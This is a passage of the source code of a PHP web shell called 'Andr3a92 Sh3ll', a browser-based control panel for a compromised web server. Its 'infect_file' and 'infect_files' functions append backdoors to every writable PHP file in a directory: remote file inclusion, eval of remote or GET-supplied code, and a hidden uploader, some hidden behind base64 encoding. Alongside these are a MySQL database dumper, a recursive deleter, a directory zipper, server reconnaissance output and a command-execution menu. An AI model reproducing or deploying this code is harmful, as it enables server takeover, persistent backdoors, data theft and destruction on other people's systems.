font-family: tahoma;
font-size: 12px;
text-decoration: none;
color: #808080;
}
a:visited{
font-family: tahoma;
font-size: 12px;
text-decoration: none;
color: #808080;
}
a:active{
font-family: tahoma;
font-size: 12px;
text-decoration: none;
color: #808080;
}
a:hover{
font-family: tahoma;
font-size: 12px;
text-decoration: none;
color: #FFFFFF;
} 
body{
background-color: #A6DFFA;
color: #808080;
font-family: tahoma;
font-size: 12px;
}
table{
font-family: tahoma;
font-size: 12px;
width: 650px;
border: solid 1px #FFFFFF;
} 
table#actions{
width: 96px;
border: 0px;
}
table#actions td{
width: 16px;
border: 0px;
}
table#querymenu{
width: 645px;
border: 0px;
}
table#querymenu td{
border: 0px;
}
table#query_act{
width: 32px;
border: 0px;
}
table#query_act td{
width: 16px;
border: 0px;
}
table#checkbox{
width: 632px;
border: 0px;
}
table#checkbox td{
border: 0px;
}
table#queryshow{
width: 332px;
border: 0px;
}
table#queryshow td{
border: 0px;
}
table#actionsdir{
width: 64px;
border: 0px;
}
table#actionsdir td{
width: 16px;
border: 0px;
}
table#drives{
border: 0px;
}
table#drives td{
border: 0px;
width: 30px;
}
table#cd{
width: 300px;
border: 0px;
}
table#cd td{
border: 0px;
}
td{
font-family: tahoma;
font-size: 12px;
border: solid 1px #FFFFFF;
}
form {
margin:0px;
padding:0px;
}
</style>
<SCRIPT LANGUAGE="JavaScript">
function calculator(user, number){
	if (user == "owner" && number == "4"){var box = eval("document.chmod.owner4");}
	if (user == "owner" && number == "2"){var box = eval("document.chmod.owner2");}
	if (user == "owner" && number == "1"){var box = eval("document.chmod.owner1");}
	if (user == "group" && number == "4"){var box = eval("document.chmod.group4");}
	if (user == "group" && number == "2"){var box = eval("document.chmod.group2");}
	if (user == "group" && number == "1"){var box = eval("document.chmod.group1");}
	if (user == "other" && number == "4"){var box = eval("document.chmod.other4");}
	if (user == "other" && number == "2"){var box = eval("document.chmod.other2");}
	if (user == "other" && number == "1"){var box = eval("document.chmod.other1");}
	if (box.checked == true){
		if (user == "owner"){
			document.chmod.h_owner.value += ("+number");
			var a = (document.chmod.h_owner.value);
			var b = eval(a);
			document.chmod.h_owner.value = b;
			document.chmod.t_owner.value = b;
		}
		if (user == "group"){
			document.chmod.h_group.value += ("+number");
			var a = (document.chmod.h_group.value);
			var b = eval(a);
			document.chmod.h_group.value = b;
			document.chmod.t_group.value = b;
		}
		if (user == "other"){
			document.chmod.h_other.value += ("+number");
			var a = (document.chmod.h_other.value);
			var b = eval(a);
			document.chmod.h_other.value = b;
			document.chmod.t_other.value = b;
		}
	}
	if (box.checked == false){
		if (user == "owner"){
			if (document.chmod.h_owner.value == ""){
				document.chmod.t_owner.value = "";
			}
			else{
				var a = (document.chmod.h_owner.value);
				b = a-(number);
				c = eval(b);
				document.chmod.h_owner.value = c;
				document.chmod.t_owner.value = c;
			}
		}
		if (user == "group"){
			if (document.chmod.h_group.value == ""){
				document.chmod.t_group.value = "";
			}
			else{
				var a=(document.chmod.h_group.value);
				b = a-(number);
				c = eval(b);
				document.chmod.h_group.value = c;
				document.chmod.t_group.value = c;
			}
		}
		if (user == "other"){
			if (document.chmod.h_other.value == ""){
				document.chmod.t_other.value = "";
			}
			else{
				var a=(document.chmod.h_other.value);
				b = a-(number);
				c = eval(b);
				document.chmod.h_other.value = c;
				document.chmod.t_other.value = c;
			}
		}
	}
}
function checkalldir(num) {
	b = eval("document.checkboxform.check1");
	if(b.checked == true){
		b = eval("document.checkboxform.check2");
		if(b.checked == true){
			b = eval("document.checkboxform.check3");
			b.checked = true;
		}
		for (i = 0; i < num; i++) {
			box = eval("document.checkboxform.dir__" + i); 
			if (box.checked == false) box.checked = true;
		}
	}
	else{
		b = eval("document.checkboxform.check3");
		if(b.checked == true) b.checked = false;
		for (i = 0; i < num; i++) {
			box = eval("document.checkboxform.dir__" + i); 
			if (box.checked == true) box.checked = false;
		}
	}
}
function checkallfile(num) {
	b = eval("document.checkboxform.check2");
	if(b.checked == true){
		b = eval("document.checkboxform.check1");
		if(b.checked == true){
			b = eval("document.checkboxform.check3");
			b.checked = true;
		}
		for (i = 0; i < num; i++) {
			box = eval("document.checkboxform.file__" + i); 
			if (box.checked == false) box.checked = true;
		}
	}
	else{
		b = eval("document.checkboxform.check3");
		if(b.checked == true) b.checked = false;
		for (i = 0; i < num; i++) {
			box = eval("document.checkboxform.file__" + i); 
			if (box.checked == true) box.checked = false;
		}
	}
}
function checkall(num,num2) {
	b = eval("document.checkboxform.check3");
	if(b.checked == true){
		box = eval("document.checkboxform.check1");
		box.checked = true;
		box = eval("document.checkboxform.check2");
		box.checked = true;
		for (i = 0; i < num; i++) {
			box = eval("document.checkboxform.dir__" + i); 
			if (box.checked == false) box.checked = true;
		}
		for (i = 0; i < num2; i++) {
			box = eval("document.checkboxform.file__" + i); 
			if (box.checked == false) box.checked = true;
		}
	}
	else{
		box = eval("document.checkboxform.check1");
		box.checked = false;
		box = eval("document.checkboxform.check2");
		box.checked = false;
		for (i = 0; i < num; i++) {
			box = eval("document.checkboxform.dir__" + i); 
			if (box.checked == true) box.checked = false;
		}
		for (i = 0; i < num2; i++) {
			box = eval("document.checkboxform.file__" + i); 
			if (box.checked == true) box.checked = false;
		}
	}
}
function invertall(num,num2){
	for(i = 0; i < num; i++){
		box = eval("document.checkboxform.dir__" + i);
		if(box.checked == true) box.checked = false;
		else box.checked = true;
	}
	for(i = 0; i < num2; i++){
		box = eval("document.checkboxform.file__" + i);
		if(box.checked == true) box.checked = false;
		else box.checked = true;
	}
	checkone(num,num2);
}
function checkone(num,num2){
	d1 = 0;
	for(i = 0; i < num; i++){
		box = eval("document.checkboxform.dir__" + i);
		if(box.checked == true) d1++;
	}
	b1 = eval("document.checkboxform.check1");
	if(d1 == num) b1.checked = true;
	else b1.checked = false;
	d2 = 0;
	for(i = 0; i < num2; i++){
		box = eval("document.checkboxform.file__" + i);
		if(box.checked == true) d2++;
	}
	b2 = eval("document.checkboxform.check2");
	if(d2 == num2) b2.checked = true;
	else b2.checked = false;
	
	b3 = eval("document.checkboxform.check3");
	if(b1.checked == true && b2.checked == true) b3.checked = true;
	else b3.checked = false;
}

function go(){
	answer = confirm("If the floppy isn't inserted in the drive A the page can give a rountime error!");
	if(answer)	document.drive_A.submit();
}
</script>
<body>
<center>
<?php
/*shell name*/
$shell = htmlspecialchars(basename($_SERVER['PHP_SELF']));

//Functions
/* download file*/
function download($file){
	$file_ = str_replace(" ","%20",$file);
	if(strpos($file_,"/") !== FALSE){
		$file_name = explode("/",$file_);
		$file_name = $file_name[count($file_name)-1];
	}
	else $file_name = $file_;
	header("Content-Type: application/octet-stream; charset=utf-8");
	header("Content-Length:" . filesize($file));
	header("Content-Disposition: attachment; filename=".$file_name );
	readfile($file);
	die();
}

/*Infect file*/
function infect_file($file,$mode,$safe = 0){
	global $strip_all;
	if($file != basename($shell)){
		$fp = fopen($file,"a+");
		if($strip_all){
			$evilcode = array(
				"rfi" => '<?php if($_GET[\'rfi\'] != "") include($_GET[\'rfi\']); ?>',
				"eval_remote_file" => '<?php if($_GET[\'remoteeval\'] != "") eval(file_get_contents($_GET[\'remoteeval\'])); ?>',
				"eval" => '<?php if($_GET[\'eval\'] != "") eval(stripslashes($_GET[\'eval\'])); ?>',
				"uploader" => '<?php if($_GET[\'upload\'] != ""){ if(!isset($_POST[\'upload\'])){ echo \'<form enctype="multipart/form-data" method="POST" action=""><br><b>File:</b><input type="file" name="file">		<input type="submit" value="Upload" name="upload"></form>\'; } else{ $temporaney = $_FILES[\'file\'][\'tmp_name\']; $upload = $_FILES[\'file\'][\'name\']; if(move_uploaded_file($temporaney,$upload)) echo \'<font color="green">File uppato!</font>\'; else echo \'<font color="red">File non uppato!</font>\'; }}?>'
			);
			$evilcode_base64 = array(
				"rfi" => '<?php eval(base64_decode("aWYoJF9HRVRbJ3JmaSddICE9ICIiKSBpbmNsdWRlKCRfR0VUWydyZmknXSk7")); ?>',
				"eval_remote_file" => '<?php eval(base64_decode("aWYoJF9HRVRbJ3JlbW90ZWV2YWwnXSAhPSAiIikgZXZhbChmaWxlX2dldF9jb250ZW50cygkX0dFVFsncmVtb3RlZXZhbCddKSk7")); ?>',
				"eval" => '<?php eval(base64_decode("aWYoJF9HRVRbJ2V2YWwnXSAhPSAiIikgZXZhbChzdHJpcHNsYXNoZXMoJF9HRVRbJ2V2YWwnXSkpOw==")); ?>',
				"uploader" => '<?php eval(base64_decode("aWYoJF9HRVRbJ3VwbG9hZCddICE9ICIiKXsgaWYoIWlzc2V0KCRfUE9TVFsndXBsb2FkJ10pKXsgZWNobyAnPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiI+PGJyPjxiPkZpbGU6PC9iPjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIj4JCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGxvYWQiIG5hbWU9InVwbG9hZCI+PC9mb3JtPic7IH0gZWxzZXsgJHRlbXBvcmFuZXkgPSAkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ107ICR1cGxvYWQgPSAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXTsgaWYobW92ZV91cGxvYWRlZF9maWxlKCR0ZW1wb3JhbmV5LCR1cGxvYWQpKSBlY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkZpbGUgdXBwYXRvITwvZm9udD4nOyBlbHNlIGVjaG8gJzxmb250IGNvbG9yPSJyZWQiPkZpbGUgbm9uIHVwcGF0byE8L2ZvbnQ+JzsgfX0=")); ?>'
			);
		}
		else{
			$evilcode = array(
				"rfi" => '<?php if($_GET[\'rfi\'] != "") include($_GET[\'rfi\']); ?>',
				"eval_remote_file" => '<?php if($_GET[\'remoteeval\'] != "") eval(file_get_contents($_GET[\'remoteeval\'])); ?>',
				"eval" => '<?php if($_GET[\'eval\'] != "") eval($_GET[\'eval\']); ?>',
				"uploader" => '<?php if($_GET[\'upload\'] != ""){ if(!isset($_POST[\'upload\'])){ echo \'<form enctype="multipart/form-data" method="POST" action=""><br><b>File:</b><input type="file" name="file">		<input type="submit" value="Upload" name="upload"></form>\'; } else{ $temporaney = $_FILES[\'file\'][\'tmp_name\']; $upload = $_FILES[\'file\'][\'name\']; if(move_uploaded_file($temporaney,$upload)) echo \'<font color="green">File uppato!</font>\'; else echo \'<font color="red">File non uppato!</font>\'; }}?>'
			);
			$evilcode_base64 = array(
				"rfi" => '<?php eval(base64_decode("aWYoJF9HRVRbJ3JmaSddICE9ICIiKSBpbmNsdWRlKCRfR0VUWydyZmknXSk7")); ?>',
				"eval_remote_file" => '<?php eval(base64_decode("aWYoJF9HRVRbJ3JlbW90ZWV2YWwnXSAhPSAiIikgZXZhbChmaWxlX2dldF9jb250ZW50cygkX0dFVFsncmVtb3RlZXZhbCddKSk7")); ?>',
				"eval" => '<?php eval(base64_decode("aWYoJF9HRVRbJ2V2YWwnXSAhPSAiIikgZXZhbCgkX0dFVFsnZXZhbCddKTs=")); ?>',
				"uploader" => '<?php eval(base64_decode("aWYoJF9HRVRbJ3VwbG9hZCddICE9ICIiKXsgaWYoIWlzc2V0KCRfUE9TVFsndXBsb2FkJ10pKXsgZWNobyAnPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiI+PGJyPjxiPkZpbGU6PC9iPjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIj4JCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGxvYWQiIG5hbWU9InVwbG9hZCI+PC9mb3JtPic7IH0gZWxzZXsgJHRlbXBvcmFuZXkgPSAkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ107ICR1cGxvYWQgPSAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXTsgaWYobW92ZV91cGxvYWRlZF9maWxlKCR0ZW1wb3JhbmV5LCR1cGxvYWQpKSBlY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkZpbGUgdXBwYXRvITwvZm9udD4nOyBlbHNlIGVjaG8gJzxmb250IGNvbG9yPSJyZWQiPkZpbGUgbm9uIHVwcGF0byE8L2ZvbnQ+JzsgfX0=")); ?>'
			);
		}
		if($safe == 0){
			if(!fwrite($fp,"\n\r".$evilcode[$mode])) return FALSE;
			else return TRUE;
		}
		else{
			if(!fwrite($fp,"\n\r".$evilcode_base64[$mode])) return FALSE;
			else return TRUE;
		}
		fclose($fp);
	}
	else return FALSE;
}

$infected_files = array();

/* global infector*/
function infect_files($mode,$dir_ = '',$safe = 0){
	global $infected_files;
	if($dir_ != "") chdir($dir_);
	foreach(glob("*.php") as $file){
		if(is_writable($file) && $file != basename($shell)){
			if(infect_file($file,$mode,$safe)) $infected_files[] = $file;
		}
	}
}

/*Mysql dump*/
function dump_table($table,$continue = 0,$add_db_name = 1) {
	if($continue == 0){
		$result = "# Dump by Andr3a92 Sh3ll\n";
		if($add_db_name == 0) $result .= "# Dump of database ".$_COOKIE['db']."\n";
		$result .= "# Dump DATE : " . date("d-M-Y") ."\n\n";
		$result .= "# Dump of $table \n";
	}
	else $result = "# Dump of $table \n";
	$table_create = mysql_query("SHOW CREATE TABLE $table");
	$table_row = mysql_fetch_array($table_create);
	$result .= $table_row[1]."\n\n";
	$query = mysql_query("SELECT * FROM $table");
	$num_fields = @mysql_num_fields($query);
	$numrow = mysql_num_rows($query);
	$all_fields = "";
	for($cr = 0; $cr <  $num_fields; $cr++){
		$name = mysql_field_name($query,$cr);
		$all_fields .= "`".$name."`";
		if($cr < ($num_fields -1)) $all_fields .= ",";
	}
	for ($a = 0; $a < $numrow; $a++){
		$row = mysql_fetch_row($query);
		$result .= "INSERT INTO ".$table."(".$all_fields.") VALUES(";
		for($b = 0; $b < $num_fields; $b++) {
			$row[$b] = addslashes($row[$b]);
			$row[$b] = ereg_replace("\n","\\n",$row[$b]);
			if (isset($row[$b])) $result .= "'$row[$b]'" ;
			else $result .= "\"\"";
			if ($b < ($num_fields-1)) $result .= ",";
		}
		$result .= ");\n";
	}
	return $result . "\n\n";
}

/* dump only a table */
function dump_db_table($host,$username,$password,$database,$table,$dump_file){
	if(mysql_connect($host,$username,$password)){
		if(mysql_select_db($database)){
			$dump = dump_table($table,0);
			if($dump_file == "" || $dump_file == ".sql") $dump_file = gen_filename('dump_'.$table.'_'.date("d_M_Y").'.sql');
			else $dump_file = gen_filename($dump_file);
			if($dump != ""){
				$fp = fopen($dump_file,"x+");
				if(fwrite($fp,$dump)) echo "<font color=\"green\">Dump done successfull!</font>";
				else echo "<font color=\"red\">An error occured! Cannot create dump file!</font>";
				fclose($fp);
			}
			else echo "<font color=\"red\">An error occured! No dump generated!</font>";
		}
		else{
			mysql_close();
			echo "<font color=\"red\">An error occurted! Could not select the database called ".htmlspecialchars($database)."!</font>";
		}
	}
	else{
		mysql_close();
		echo "<font color=\"red\">An error occurted! Could not login ".htmlspecialchars($username)." @ ".htmlspecialchars($host)."!</font>";
	}
}

/* Db dump */
function dump_db($host,$username,$password,$database,$dump_file){
	if(mysql_connect($host,$username,$password)){
		if(mysql_select_db($database)){
			$dump = "";
			$show = mysql_query("SHOW TABLES");
			$a = 0;
			while($row = mysql_fetch_array($show)){
				$dump .= dump_table($row[0],$a,$a);
				$a++;
			}
			mysql_close();
			if($dump_file == "" || $dump_file == ".sql") $dump_file = gen_filename('dump_'.date("d_M_Y").'.sql');
			else $dump_file = gen_filename($dump_file);
			if($dump != ""){
				$fp = fopen($dump_file,"x+");
				if(fwrite($fp,$dump)) echo "<font color=\"green\">Dump done successfull!</font>";
				else echo "<font color=\"red\">An error occured! Cannot create dump file!</font>";
				fclose($fp);
			}
			else echo "<font color=\"red\">An error occured! No dump generated!</font>";
		}
		else{
			mysql_close();
			echo "<font color=\"red\">An error occurted! Could not select the database called ".htmlspecialchars($database)."!</font>";
		}
	}
	else{
		mysql_close();
		echo "<font color=\"red\">An error occurted! Could not login ".htmlspecialchars($username)." @ ".htmlspecialchars($host)."!</font>";
	}
}

/* no duplicate filenames */
function gen_filename($filename){
	if(is_file($filename)){
		$exp = explode(".",$filename);
		$filename = "";
		for($a = 0; $a < count($exp) - 1; $a++) $filename .= $exp[$a];
		$filename .= "_2.".$exp[count($exp)-1];
		if(is_file($filename)) return gen_filename($filename);
		else return $filename;
	}
	else return $filename;
}

/*size of file in b , KB, MB*/
function format_num($num){
	if($num < 1024){
		$totalnum = $num." b";
	}
	elseif($num >= 1024 AND $num < 1048576){
		$to_divide = $num / 1024;
		$num_total = number_format($to_divide, 2, '.', '');
		$totalnum = $num_total." KB";
	}
	elseif($num >= 1048576 AND $num < 1073741824){
		$to_divide = $num / 1048576;
		$num_total = number_format($to_divide, 2, '.', '');
		$totalnum = $num_total." MB";
	}
	elseif($num >= 1073741824){
		$to_divide = $num / 1073741824;
		$num_total = number_format($to_divide, 2, '.', '');
		$totalnum = $num_total." GB";
	}
	return $totalnum;
}

/* decimal semplification */
function format_num_($num){
	if(strpos($num,".") !== FALSE){
		$num = explode(".",$num);
		$dec = $num[1];
		if($dec[0] > 5) $num = $num[0] + 1;
		else $num = $num[0];
	}
	else $num = $num;
	return $num;
}

/*size of file in b , KB, MB*/
function totalsize($filesize){
	$size = filesize($filesize);
	$totalsize = format_num($size);
	return $totalsize;
}

/*remove a dir and all file inside it*/
function rmdirr($dir_rm) {
	if($internal = @glob($dir_rm."/*")){
		foreach($internal as $file) {
			if(is_file($file)) @unlink($file);
			elseif(is_dir($file)) rmdirr($file);
		}
	}
	@rmdir($dir_rm);
}

/*file permissions*/
function getperms($f)  {
	$mode = fileperms($f);
	$perm = "";
	$perm .= ($mode & 00400) ? 'r' : '-';
	$perm .= ($mode & 00200) ? 'w' : '-';
	$perm .= ($mode & 00100) ? 'x' : '-';
	$perm .= ($mode & 00040) ? 'r' : '-';
	$perm .= ($mode & 00020) ? 'w' : '-';
	$perm .= ($mode & 00010) ? 'x' : '-';
	$perm .= ($mode & 00004) ? 'r' : '-';
	$perm .= ($mode & 00002) ? 'w' : '-';
	$perm .= ($mode & 00001) ? 'x' : '-';
	return $perm;
}
// Zip functions

/*zip vars*/
$datasec = array();
$ctrl_dir = array();
$eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
$old_offset = 0;
$zip_error = array();

/* convert time */
function unix2DosTime($unixtime = 0) {
	$timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
	if ($timearray['year'] < 1980){
		$timearray['year']    = 1980;
		$timearray['mon']     = 1;
		$timearray['mday']    = 1;
		$timearray['hours']   = 0;
		$timearray['minutes'] = 0;
		$timearray['seconds'] = 0;
	}
	return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
}

/*gen file in archive*/
function add_File($data, $name, $time = 0){
	global $datasec;
	global $ctrl_dir;
	global $old_offset;
	$name = str_replace('\\', '/', $name);
	$dtime = dechex(unix2DosTime($time));
	$hexdtime = '\x'.$dtime[6].$dtime[7].'\x'.$dtime[4].$dtime[5].'\x'.$dtime[2].$dtime[3].'\x'.$dtime[0].$dtime[1];
	eval('$hexdtime = "' . $hexdtime . '";');
	$unc_len = strlen($data);
	$crc = crc32($data);
	$zdata = gzcompress($data);
	$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
	$c_len = strlen($zdata);
	$fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00".$hexdtime.pack('V', $crc).pack('V', $c_len).pack('V', $unc_len).pack('v', strlen($name)).pack('v', 0).$name.$zdata.pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
	$datasec[] = $fr;
	$new_offset = strlen(implode('', $datasec));
	$cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00".$hexdtime.pack('V', $crc).pack('V', $c_len).pack('V', $unc_len).pack('v', strlen($name) ).pack('v', 0 ).pack('v', 0 ).pack('v', 0 ).pack('v', 0 ).pack('V', 32 ).pack('V', $old_offset );
	$old_offset = $new_offset;
	$cdrec .= $name;
	$ctrl_dir[] = $cdrec; 
}

/* gen file contents*/
function gen_file(){
	global $eof_ctrl_dir;
	global $datasec;
	global $ctrl_dir;
	$data = implode('', $datasec);
	$ctrldir = implode('', $ctrl_dir);
	return $data . $ctrldir . $eof_ctrl_dir . pack('v', sizeof($ctrl_dir)) . pack('v', sizeof($ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
}

/* add a file */
function addFile($file) {
	if (file_exists($file)) add_File(implode('',file($file)),$file);
	else zip_error($file,1);
}

/* add dir */
function addDir($dira,$path = -1) {
	if (file_exists($dira)) {
		if ($path == -1) $path = $dira;
		$dir_ = opendir($dira);
		if(readdir($dir_)){
			while ($file = readdir($dir_)) {
				add_File(implode('',file($dira."/".$file)),$path."/".$file);
			}
		}
	}
	else zip_error($dira,2);
}

/* add all file in a dir*/
function PackDir($dira = ''){
	$current_dir = getcwd();
	if($dira != '') chdir($dira);
	$row = array();
	foreach(glob("*") as $file){
		$row[] = $file;
	}
	chdir($current_dir);
	for($a = 0; $a < count($row); $a++){
		if($row[$a] != "." && $row[$a] != ".."){
			if($dira != ''){
				if(is_dir($dira."/".$row[$a])) PackDir($dira."/".$row[$a]);
				else addFile($dira."/".$row[$a]);
			}
			else{
				if(is_dir($row[$a])) PackDir($row[$a]);
				else addFile($row[$a]);
			}
		}
	}
}

/* create archive */
$name_zip = "";
function create_zip($file,$dir_zip = '') {
	global $zip_error;
	global $name_zip;
	PackDir($dir_zip);
	$file = gen_filename($file);
	$name_zip = $file;
	$fp = fopen($file,'a+');
	fwrite($fp,gen_file());
	fclose($fp);
	if($zip_error[0] != "") return false;
	else return true;
}

/* errors of zip */
function zip_error($name,$type){
	global $zip_error;
	if($type == 1) $type = "file";
	elseif($type == 2) $type = "directory";
	$zip_error[] = "Error adding ".$type." ".$name;
}

// All Informations:

/*ip address*/
$ip = $_SERVER['REMOTE_ADDR'];

/*site referer*/
$referer = $_SERVER['HTTP_REFERER'];

if($referer == "") $referer = "null";

/*shell location*/
$shell_location = getcwd();

/*ip of server*/
$server_ip = $_SERVER['SERVER_ADDR'];

/*useragent*/
$useragent = htmlspecialchars($_SERVER["HTTP_USER_AGENT"]);

/*server software*/
$server_software = $_SERVER['SERVER_SOFTWARE'];

/*uname*/
$uname = php_uname();

/*document root*/
$doc_root = $_SERVER['DOCUMENT_ROOT'];

/*magic_quotes_gpc*/
if(ini_get("magic_quotes_gpc") != 0) $magic_quotes_gpc = "<font color=\"green\">On</font>";
elseif(ini_get("magic_quotes_gpc") == 0)$magic_quotes_gpc = "<font color=\"red\">Off</font>";

/*safe mode*/
if(ini_get("safe_mode") == 0)$safe_mode = "<font color=\"red\">Off</font>";

elseif(ini_get("safe_mode") != "0")$safe_mode = "<font color=\"green\">On</font>";

/*register globals*/
if(ini_get("register_globals")  == "1")$registerglobals = "<font color=\"green\">On</font>";
elseif(ini_get("register_globals") != "1")$registerglobals = "<font color=\"red\">Off</font>";

/*Space free*/
$freespace = format_num(disk_free_space(getcwd()));

/*Total space*/
$totalspace = format_num(disk_total_space(getcwd()));

/* Used space */
$usedspace = format_num(disk_total_space(getcwd()) - disk_free_space(getcwd()));

/* % free space */
$percentfreespace = format_num_((disk_free_space(getcwd()) * 100) / disk_total_space(getcwd()));

/* % used space */
$percentusedspace = 100 - $percentfreespace;

//GET vars
/*dir location*/
$dir = htmlspecialchars($_POST['dir']);

/*dir actions*/
$dirdelete = htmlspecialchars($_POST['dirdelete']);
$dirrename = htmlspecialchars($_POST['dirrename']);

/*file actions*/
$filedelete = htmlspecialchars($_POST['filedelete']);
$fileopen = htmlspecialchars($_POST['fileopen']);
$fileedit = htmlspecialchars($_POST['fileedit']);
$filerename = htmlspecialchars($_POST['filerename']);
$filecopy = htmlspecialchars($_POST['filecopy']);
$infectfile = htmlspecialchars($_POST['infectfile']);
$infectdir = htmlspecialchars($_POST['infectdir']);

/*Actions*/
$action = htmlspecialchars($_POST['action']);

/* chmod var */
$chmod = htmlspecialchars($_POST['chmod']);

if($dir != ""){
	if($strip_all) $dir = stripslashes($dir);
	chdir($dir);
	$dir = getcwd();
}
else $dir = getcwd();
if(is_file($shell_location."/".md5('andr3a92'))) $lk = "unlock";
else $lk = "lock";
echo "<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
<tr><td bgcolor=\"black\"><center><table id=\"querymenu\"><tr><td><center><font size=\"3\" color=\"#00ff00\">Andr3a92 Sh3ll ~ Info</font></center></td><td width=\"16\"><form action=\"\" method=\"POST\" name=\"lockactions\">
<input type=\"hidden\" name=\"lockaction\" value=\"".$lk."\"><a href=\"#\" onclick=\"document.lockactions.submit()\"><img src=\"".$shell."?img=".$lk."\" border=\"0\" title=\"".$lk."\"></a></form></td>";
if($lk == "unlock") echo "<td width=\"16\"><form action=\"\" method=\"POST\" name=\"logout\"><input type=\"hidden\" name=\"logout\" value=\"1\"><a href=\"#\" onclick=\"document.logout.submit()\"><img src=\"".$shell."?img=logout\" border=\"0\" title=\"Logout\"></a></form></td>";
echo "</tr></table></center></td></tr></table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
<tr><td bgcolor=\"#CCCCCC\"><center><font color=\"red\">Server Info</font></center></td></tr>
<tr><td bgcolor=\"#CCCCCC\">
&nbsp;&nbsp;&nbsp;Server ip: ".$server_ip."<br>
&nbsp;&nbsp;&nbsp;Server software: ".$server_software."<br>
&nbsp;&nbsp;&nbsp;Uname -a: ".$uname."<br>
&nbsp;&nbsp;&nbsp;Total space: ".$totalspace."<br>
&nbsp;&nbsp;&nbsp;Used space: ".$usedspace." [ ".$percentusedspace."% ]<br>
&nbsp;&nbsp;&nbsp;Free space: ".$freespace." [ ".$percentfreespace."% ]<br>
</td></tr><tr><td bgcolor=\"#CCCCCC\"><center><font color=\"red\">Your Info</font></center></td></tr>
<tr><td bgcolor=\"#CCCCCC\">
&nbsp;&nbsp;&nbsp;Your ip: ".$ip."<br>
&nbsp;&nbsp;&nbsp;Useragent: ".$useragent."<br>
</td></tr><tr><td bgcolor=\"#CCCCCC\"><center><font color=\"red\">Generic Info</font></center></td></tr>
<tr><td bgcolor=\"#CCCCCC\">
&nbsp;&nbsp;&nbsp;Site referer: ".$referer."<br>
&nbsp;&nbsp;&nbsp;Current dir: ".$dir."<br>
&nbsp;&nbsp;&nbsp;Shell location: ".$shell_location."<br>
&nbsp;&nbsp;&nbsp;Document root: ".$doc_root."<br>
&nbsp;&nbsp;&nbsp;Shell name: ".$shell."<br>
&nbsp;&nbsp;&nbsp;Safe mode: ".$safe_mode."<br>
&nbsp;&nbsp;&nbsp;Register Globals: ".$registerglobals."<br>
&nbsp;&nbsp;&nbsp;Magic Quotes: ".$magic_quotes_gpc."</td></tr><tr><td bgcolor=\"#CCCCCC\"><center><font color=\"red\">Chdir</font></center></td></tr>";
if(strtolower(substr(PHP_OS,0,3)) == "win"){
	echo "<tr><td bgcolor=\"#CCCCCC\"><table id=\"drives\"><tr>";
	foreach(range("A","Z") as $letter){
		if($letter == "A") echo '<td><form name="drive_A" action="'.$shell.'" method="POST"><input type="hidden" name="dir" value="'.("A:\\").'"><a href="#" onclick="go()">[ A ]</a></form></td>';
		else{
			if(is_dir($letter.":\\")) echo '<td><form name="drive_'.$letter.'" action="'.$shell.'" method="POST"><input type="hidden" name="dir" value="'.($letter.":\\").'"><a href="#" onclick="document.drive_'.$letter.'.submit()">[ '.$letter.' ]</a></form></td>';
		}
	}
	echo "</tr></table></td></tr>";
}
echo "<tr><td bgcolor=\"#CCCCCC\"><form action=\"\" method=\"POST\" name=\"ChDir\">&nbsp;&nbsp;&nbsp;Dir path: <input type=\"text\" size=\"30\" name=\"dir\" value=\"".getcwd()."\"> <input type=\"submit\" value=\"Chdir\"></form></td></tr></table><br>
<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
<tr><td bgcolor=\"black\"><center><font size=\"3\" color=\"#00ff00\">Andr3a92 Sh3ll ~ Tools</font></center></td></tr>
</table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr>
<td bgcolor=\"#CCCCCC\"><center><form action=\"".$shell."\" method=\"POST\" name=\"action0\"><input type=\"hidden\" name=\"action\" value=\"upload\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><a href=\"#\" onclick=\"document.action0.submit()\">Upload a file</a></center></form></td>
<td bgcolor=\"#CCCCCC\"><center><form action=\"".$shell."\" method=\"POST\" name=\"action1\"><input type=\"hidden\" name=\"action\" value=\"md\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><a href=\"#\" onclick=\"document.action1.submit()\">Make a directory</a></center></form></td>
<td bgcolor=\"#CCCCCC\"><center><form action=\"".$shell."\" method=\"POST\" name=\"action2\"><input type=\"hidden\" name=\"action\" value=\"exe\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><a href=\"#\" onclick=\"document.action2.submit()\">Execute a command</a></center></form></td>
<td bgcolor=\"#CCCCCC\"><center><form action=\"".$shell."\" method=\"POST\" name=\"action3\"><input type=\"hidden\" name=\"action\" value=\"mf\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><a href=\"#\" onclick=\"document.action3.submit()\">Make a file</a></center></form></td>
